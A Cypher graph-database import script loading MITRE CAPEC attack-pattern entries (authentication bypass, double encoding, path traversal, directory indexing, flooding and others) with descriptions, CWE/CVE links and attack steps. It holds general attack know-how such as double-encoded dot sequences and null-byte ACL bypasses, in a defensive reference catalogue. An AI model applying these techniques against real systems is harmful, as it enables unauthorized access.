MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 57});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns"});
CREATE (:Modification{id: 58});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Typical_Likelihood_of_Exploit"});
CREATE (:PreviousEntryName{id: 18, name: "API Abuse/Misuse"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 89, summary: "OrderedDict([('Text', 'An adversary manipulates the use or processing of an Application Programming Interface (API) resulting in an adverse impact upon the security of the system implementing the API. This can allow the adversary to execute functionality not intended by the API implementation, possibly compromising the system which integrates the API. API manipulation can take on a number of forms including forcing the unexpected use of an API, or the use of an API in an unintended way. For example, an adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution. Another example could be API methods that should be disabled in a production application but were not, thus exposing dangerous functionality within a production environment.')])"});
MERGE (:CWE{id: 227});
CREATE (:ResourcesRequired{id: 17, text: "<div level=\"0\">\n  <p class=\"text\">The requirements vary depending upon the nature of the API. For application-layer APIs related to the processing of the HTTP protocol, one or more of the following may be needed: a MITM (Man-In-The-Middle) proxy, a web browser, or a programming/scripting language.</p>\n</div>"});
CREATE (:AttackPattern{id: 114, name: "Authentication Abuse", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 44, text: "<div level=\"0\">\n  <p class=\"text\">An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way.</p>\n</div>"});
CREATE (:Submission{id: 90});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 59});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 90, summary: "OrderedDict([('Text', 'An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme\\'s implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target\\'s authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the \"Exploitation of Session Variables, Resource IDs and other Trusted Credentials\" attack patterns.')])"});
MERGE (:CWE{id: 287});
CREATE (:ResourcesRequired{id: 18, text: "<div level=\"0\">\n  <p class=\"text\">A client application, command-line access to a binary, or scripting language capable of interacting with the authentication mechanism.</p>\n</div>"});
CREATE (:AttackPattern{id: 115, name: "Authentication Bypass", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 45, text: "<div level=\"0\">\n  <p class=\"text\">An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc.</p>\n</div>"});
CREATE (:Submission{id: 91});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 60});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 91, summary: "OrderedDict([('Text', 'An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place. This refers to an attacker gaining access equivalent to an authenticated user without ever going through an authentication procedure. This is usually the result of the attacker using an unexpected access procedure that does not go through the proper checkpoints where authentication should occur. For example, a web site might assume that all users will click through a given link in order to get to secure material and simply authenticate everyone that clicks the link. However, an attacker might be able to reach secured web content by explicitly entering the path to the content rather than clicking through the authentication link, thereby avoiding the check entirely. This attack pattern differs from other authentication attacks in that attacks of this pattern avoid authentication entirely, rather than faking authentication by exploiting flaws or by stealing credentials from legitimate users.')])"});
MERGE (:CWE{id: 592});
CREATE (:ResourcesRequired{id: 19, text: "<div level=\"0\">\n  <p class=\"text\">A client application, such as a web browser, or a scripting language capable of interacting with the target.</p>\n</div>"});
CREATE (:AttackPattern{id: 116, name: "Excavation", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 46, text: "<div level=\"0\">\n  <p class=\"text\">An adversary requires some way of interacting with the system.</p>\n</div>"});
CREATE (:Submission{id: 92});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 61});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact"});
CREATE (:Modification{id: 62});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Other_Notes, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 92, summary: "OrderedDict([('Text', 'An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes. This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Examplar exchanges with the target may trigger unhandled exceptions or verbose error messages that reveal information like stack traces, configuration information, path information, or database design. This type of attack also includes the manipulation of query strings in a URI to produce invalid SQL queries, or by trying alternative path values in the hope that the server will return useful information.')])"});
MERGE (:CWE{id: 200});
CREATE (:ResourcesRequired{id: 20, text: "<div level=\"0\">\n  <p class=\"text\">A tool, such as a MITM Proxy or a fuzzer, that is capable of generating and injecting custom inputs to be used in the attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 117, name: "Interception", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 47, text: "<div level=\"0\">\n  <p class=\"text\">For an interception attack to be possible, the target must be transmitting data over a medium that is accessible to the adversary. Any target that transmits information over a public network is potentially vulnerable to this type of attack.</p>\n</div>"});
CREATE (:Submission{id: 93});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 63});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 93, summary: "OrderedDict([('Text', 'An adversary monitors data streams to or from a target in order to gather information. This attack may be undertaken to gather information to support a later attack or the data collected may be the end goal of the attack. This attack usually involves sniffing network traffic, but may include observing other types of data streams, such as radio. In most varieties of this attack, the attacker is passive and simply observes regular communication, however in some variants the attacker may attempt to initiate the establishment of a data stream or influence the nature of the data transmitted. However, in all variants of this attack, and distinguishing this attack from other data collection methods, the attacker is not the intended recipient of the data stream. Unlike some other data leakage attacks, the attacker is observing explicit data channels (e.g. network traffic) and reading the content. This differs from attacks that collect more qualitative information, such as communication volume, or other information not explicitly communicated via a data stream.')])"});
MERGE (:CWE{id: 200});
CREATE (:ResourcesRequired{id: 21, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have the necessary technology to intercept information passing between the nodes of a network. For TCP/IP, the capability to run tcpdump, ethereal, etc. can be useful. Depending upon the data being targeted the technological requirements will change.</p>\n</div>"});
CREATE (:AttackPattern{id: 12, name: "Choosing Message Identifier", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 48, text: "<div level=\"0\">\n  <p class=\"text\">Information and client-sensitive (and client-specific) data must be present through a distribution channel available to all users.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 49, text: "<div level=\"0\">\n  <p class=\"text\">Distribution means must code (through channel, message identifiers, or convention) message destination in a manner visible within the distribution means itself (such as a control channel) or in the messages themselves.</p>\n</div>"});
CREATE (:Submission{id: 94});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 64});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:PreviousEntryName{id: 19, name: "Choosing a Message/Channel Identifier on a Public/Multicast Channel"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 94, summary: "OrderedDict([('Text', \"This pattern of attack is defined by the selection of messages distributed over via multicast or public information channels that are intended for another client by determining the parameter value assigned to that client. This attack allows the adversary to gain access to potentially privileged information, and to possibly perpetrate other attacks through the distribution means by impersonation. If the channel/message being manipulated is an input rather than output mechanism for the system, (such as a command bus), this style of attack could be used to change the adversary's identifier to more a privileged one.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine the nature of messages being transported as well as the identifiers to be used as part of the attack</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">If required, authenticate to the distribution channel</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">If any particular client's information is available through the transport means simply by selecting a particular identifier, an attacker can simply provide that particular identifier.</p>\n</div>"});
CREATE (:AttackStep{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Attackers with client access connecting to output channels could change their channel identifier and see someone else's (perhaps more privileged) data.</p>\n</div>"});
MERGE (:CWE{id: 201});
MERGE (:CWE{id: 306});
CREATE (:ResourcesRequired{id: 22, text: "<div level=\"0\">\n  <p class=\"text\">The Attacker needs the ability to control source code or application configuration responsible for selecting which message/channel id is absorbed from the public distribution means.</p>\n</div>"});
CREATE (:AttackPattern{id: 120, name: "Double Encoding", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 50, text: "<div level=\"0\">\n  <p class=\"text\">The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.</p>\n</div>"});
CREATE (:Submission{id: 95});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 95, summary: "OrderedDict([('Text', 'The attacker utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. The may allow the attacker to bypass filters that attempt to detect illegal characters or strings, such as might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.')])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Try double-encoding for parts of the input in order to try to get past the filters. For instance, by double encoding certain characters in the URL (e.g. dots and slashes) an attacker may try to get access to restricted resources on the web server or force browse to protected pages (thus subverting the authorization service). An attacker can also attempt other injection style attacks using this attack pattern: command injection, SQL injection, etc.</p>\n</div>"});
CREATE (:ResourcesRequired{id: 23, text: "<div level=\"0\">\n  <p class=\"text\">Tools that automate encoding of data can assist attackers in generating encoded strings.</p>\n</div>"});
CREATE (:AttackPattern{id: 121, name: "Exploit Test APIs", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 51, text: "<div level=\"0\">\n  <p class=\"text\">The target must have installed test APIs and failed to secure or remove them when brought into a production environment.</p>\n</div>"});
CREATE (:Submission{id: 96});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:PreviousEntryName{id: 20, name: "Locate and Exploit Test APIs"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 96, summary: "OrderedDict([('Text', 'An attacker exploits a sample, demonstration, or test API that is insecure by default and should not be resident on production systems. Some applications include APIs that are intended to allow an administrator to test and refine their domain. These APIs should usually be disabled once a system enters a production environment. Testing APIs may expose a great deal of diagnostic information intended to aid an administrator, but which can also be used by an attacker to further refine their attack. Moreover, testing APIs may not have adequate security controls or may not have undergone rigorous testing since they were not intended for use in production environments. As such, they may have many flaws and vulnerabilities that would allow an attacker to severely disrupt a target.')])"});
MERGE (:CWE{id: 770});
CREATE (:ResourcesRequired{id: 24, text: "<div level=\"0\">\n  <p class=\"text\">For some APIs, the attacker will need that appropriate client application that interfaces with the API. Other APIs can be executed using simple tools, such as web browsers or console windows. In some cases, an attacker may need to be able to authenticate to the target before it can access the vulnerable APIs.</p>\n</div>"});
CREATE (:AttackPattern{id: 122, name: "Privilege Abuse", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 52, text: "<div level=\"0\">\n  <p class=\"text\">The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 53, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources.</p>\n</div>"});
CREATE (:Submission{id: 97});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 65});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 97, summary: "OrderedDict([('Text', 'An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.')])"});
MERGE (:CWE{id: 732});
MERGE (:CWE{id: 602});
MERGE (:CWE{id: 434});
CREATE (:ResourcesRequired{id: 25, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for this attack beyond the ability to access the target.</p>\n</div>"});
CREATE (:AttackPattern{id: 123, name: "Buffer Manipulation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 54, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must identify a programmatic means for interacting with a buffer, such as vulnerable C code, and be able to provide input to this interaction.</p>\n</div>"});
CREATE (:Submission{id: 98});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 66});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Motivation-Consequences, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Solutions_and_Mitigations"});
CREATE (:Description{id: 98, summary: "OrderedDict([('Text', \"An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.\")])"});
CREATE (:AttackPattern{id: 124, name: "Shared Data Manipulation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 55, text: "<div level=\"0\">\n  <p class=\"text\">The target applications (or target application threads) must share data between themselves.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 56, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to manipulate some piece of the shared data either directly or indirectly and the other users of the data must accept the changed data as valid.</p>\n</div>"});
CREATE (:Submission{id: 99});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 67});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 21, name: "Attack through Shared Data"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 99, summary: "OrderedDict([('Text', 'An adversary exploits a data structure shared between multiple applications or an application pool to affect application behavior. Data may be shared between multiple applications or between multiple threads of a single application. Data sharing is usually accomplished through mutual access to a single memory location. If an attacker can manipulate this shared data (usually by co-opting one of the applications or threads) the other applications or threads using the shared data will often continue to trust the validity of the compromised shared data and use it in their calculations. This can result in invalid trust assumptions, corruption of additional data through the normal operations of the other users of the shared data, or even cause a crash or compromise of the sharing applications.')])"});
MERGE (:CWE{id: 682});
CREATE (:ResourcesRequired{id: 26, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to change the shared data. Usually this requires that the attacker be able to compromise one of the sharing applications or threads in order to manipulated the shared data.</p>\n</div>"});
CREATE (:AttackPattern{id: 125, name: "Flooding", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 57, text: "<div level=\"0\">\n  <p class=\"text\">Any target that services requests is vulnerable to this attack on some level of scale.</p>\n</div>"});
CREATE (:Submission{id: 100});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 68});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Motivation-Consequences, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 100, summary: "OrderedDict([('Text', \"An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.\")])"});
MERGE (:CWE{id: 404});
MERGE (:CWE{id: 770});
CREATE (:ResourcesRequired{id: 27, text: "<div level=\"0\">\n  <p class=\"text\">A script or program capable of generating more requests than the target can handle, or a network or cluster of objects all capable of making simultaneous requests.</p>\n</div>"});
CREATE (:AttackPattern{id: 126, name: "Path Traversal", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AlternateTerm{id: 1, term: "Directory Traversal"});
CREATE (:AttackPrerequisite{id: 58, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to control the path that is requested of the target.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 59, text: "<div level=\"0\">\n  <p class=\"text\">The target must fail to adequately sanitize incoming paths</p>\n</div>"});
CREATE (:Submission{id: 101});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 69});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Alternate_Terms, Architectural_Paradigms, Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, CIA_Impact, Examples-Instances, Frameworks, Injection_Vector, Languages, Payload, Payload_Activation_Impact, Platforms, Purposes, References, Related_Attack_Patterns, Related_Vulnerabilities, Related_Weaknesses, Relevant_Security_Requirements, Solutions_and_Mitigations, Technical_Context, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:Description{id: 101, summary: "OrderedDict([('Text', 'An adversary uses path manipulation methods to exploit insufficient input validation of a target to obtain access to data that should be not be retrievable by ordinary well-formed requests. A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or \\\\) and/or dots (.)) to reach desired directories or files.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.76.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-5", local_id: "R.139.1", title: "The OWASP Application Security Desk Reference", section: "Path Traversal", publisher: "The Open Web Application Security Project (OWASP)", pubdate: "2009", link: "https://www.owasp.org/index.php/Path_Traversal"});
MERGE (:Reference{id: "REF-4", local_id: "R.139.2", title: "OWASP Testing Guide", section: "Testing for Path Traversal (OWASP-AZ-001)", publisher: "The Open Web Application Security Project (OWASP)", pubdate: "2010", link: "https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)"});
MERGE (:Reference{id: "REF-1", local_id: "R.139.3", title: "WASC Threat Classification 2.0", section: "WASC-33 - Path Traversal", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/w/page/13246952/Path-Traversal"});
CREATE (:CVE{id: "CVE-2010-0467", description: "<div level=\"0\">\n  <p class=\"text\">Newsletter module allows reading arbitrary files using \"../\" sequences.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2009-4581", description: "<div level=\"0\">\n  <p class=\"text\">PHP program allows arbitrary code execution using \"..\" in filenames that are fed to the include() function.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2012-2919", description: "<div level=\"0\">\n  <p class=\"text\">Directory traversal vulnerability in Upload/engine.php in Chevereto 1.9.1 allows remote attackers to determine the existence of arbitrary files via a .. (dot dot) in the v parameter..</p>\n</div>"});
CREATE (:CVE{id: "CVE-2012-1917", description: "<div level=\"0\">\n  <p class=\"text\">compose.php in @Mail WebMail Client in AtMail Open-Source before 1.05 does not properly handle ../ (dot dot slash) sequences in the unique parameter, which allows remote attackers to conduct directory traversal attacks and read arbitrary files via a ..././ (dot dot dot slash dot slash) sequence.</p>\n</div>"});
MERGE (:CWE{id: 22});
CREATE (:ResourcesRequired{id: 28, text: "<div level=\"0\">\n  <p class=\"text\">The ability to manually manipulate path information either directly through a client application relative to the service or application or via a proxy application.</p>\n</div>"});
CREATE (:AttackPattern{id: 127, name: "Directory Indexing", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 60, text: "<div level=\"0\">\n  <p class=\"text\">The target must be misconfigured to return a list of a directory's content when it receives a request that ends in a directory name rather than a file name.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 61, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must be able to control the path that is requested of the target.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 62, text: "<div level=\"0\">\n  <p class=\"text\">The administrator must have failed to properly configure an ACL or has associated an overly permissive ACL with a particular directory.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 63, text: "<div level=\"0\">\n  <p class=\"text\">The server version or patch level must not inherently prevent known directory listing attacks from working.</p>\n</div>"});
CREATE (:Submission{id: 102});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 70});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References, Related_Attack_Patterns"});
CREATE (:Description{id: 102, summary: "OrderedDict([('Text', \"An adversary crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An adversary can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Directory Discovery", description: "<div level=\"0\">\n  <p class=\"text\">Use a method, either manual, scripted, or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the adversary is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Send requests to the web server for common directory names</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">If directories are discovered that are native to a server type further refine the directory search to include directories usually present on those types of servers.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Search for uncommon or potentially user created directories that may be present.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">ACLs or other access control mechanisms are present in the application or server configuration that indicate the existence of the directory but the attacker lacks the proper authorization to access the directory (HTTP Status Code 401)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">ACLs or other access control mechanisms are present in the application or server configuration that indicate the existence of the directory, but access is forbidden and authorization will not help. (HTTP Status Code 403)</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The directory exists and can be accessed. HTTP Status Code 200 is the standard code for a successful request</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The directory may or may not exist because the server is redirecting the user to another location. HTTP Status codes 301 or 302 indicate the server configuration is redirecting the user to some other page or directory. It cannot be automatically assumed that the location to which the attacker is redirected is the requested directory located elsewhere.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The adversary compiles a list of one or more directories that exist on the server. Some of these directories may not be immediately accessible but they are present."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Iteratively explore directory/file structures", description: "<div level=\"0\">\n  <p class=\"text\">The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website by issuing a request ending the URL in a slash '/'.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Sequentially request a list of common base files to each directory discovered.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a \"/\" request</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">There are no normal base files (index.html /home.html /default.html /default.asp /default.asp / index.php) at present</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">\"File not found\" error messages along with invalid path name.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The website automatically redirects to the base file. Note that the attacker may still be able to explore the directory listings.</p>\n</div>"});
